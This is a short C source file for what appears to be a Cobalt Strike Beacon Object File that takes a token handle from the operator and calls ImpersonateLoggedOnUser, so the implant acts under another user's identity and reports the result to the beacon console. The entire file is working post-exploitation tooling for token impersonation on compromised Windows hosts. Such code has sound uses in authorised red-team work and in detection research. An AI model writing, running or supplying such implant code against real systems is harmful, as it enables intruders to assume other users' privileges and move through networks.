#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "../tkerror.h"

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    HANDLE token_handle = NULL;

    BeaconDataParse(&parser, Buffer, Length);
    token_handle = (HANDLE)(ULONG_PTR)(DWORD) BeaconDataInt(&parser);

    if (!ADVAPI32$ImpersonateLoggedOnUser(token_handle))
    {
        DWORD dwError = KERNEL32$GetLastError();
        char errMsg[256];
        TkErrorMessage(dwError, errMsg, sizeof(errMsg));
        BeaconPrintf(CALLBACK_ERROR, "[-] use: ImpersonateLoggedOnUser failed: %s\n", errMsg);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonating handle 0x%lx\n", (ULONG_PTR) token_handle);
}
